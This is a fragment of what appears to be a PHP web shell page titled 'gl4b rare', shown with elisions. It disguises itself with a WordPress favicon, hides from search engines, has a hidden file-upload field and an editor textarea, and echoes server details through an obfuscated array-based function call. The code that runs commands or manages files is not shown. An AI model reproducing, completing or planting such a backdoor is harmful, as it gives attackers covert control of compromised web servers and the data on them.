...
<!DOCTYPE html>
    ...
    <link rel="icon" type="image/x-icon" href="https://cdn.icon-icons.com/icons2/836/PNG/512/Wordpress_icon-icons.com_66780.png">   
        <head>
            <meta charset="UTF-8">
            <meta name="robots" content="NOINDEX, NOFOLLOW">
 
                <title>gl4b rare</title>   
<style>
@charset "UTF-8";@import url(https://use.fontawesome.com/releases/v5.8.1/css/all.css);@font-face{font-family:Consolas}html{margin-left:1em;margin-right:1em;margin-top:-1.5em;background:#091a1f!important;font-family:Courier;}.x{text-align:center}.y{font-family:i;font-size:calc(2.3em + 2.3vw);color:#000000}.y:hover{color:white}.w{color:white}.b{color:#000000}.q{margin-top:.5em}article{margin-top:1.5em;font-size:.9em}.i{float:left}.u{float:right;text-align:right;margin-bottom:1.5em}input[type=file]{display:none}input[type=submit]{border:1px solid #000000;padding:.2em;background:0 0}td{color:#ffffff}th{font-weight:400;border-bottom:thin solid #ffffff;color:#ffffff}.et{text-align:left;color:#ffffff}.r:hover{background:#ffffff}.l{border:1px solid #ffffff;padding:1px;background:0 0}footer{margin-top:2em;height:2.2rem;width:100%;font-size:.9em}footer:hover{color:#ffffff}a{text-decoration:none;color:white}a:hover{color:white}.m{margin-left:2.4em}textarea{background:0 0;border:none;width:70%;height:30em;font-family:Courier;font-size:.9em}textarea.o{background:#ffffff}.h{color:#ffffff}
</style>
        </head>
        ...
        <body>
            ...
            <article>
                <div class="i">
                    ...
                    </i><b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
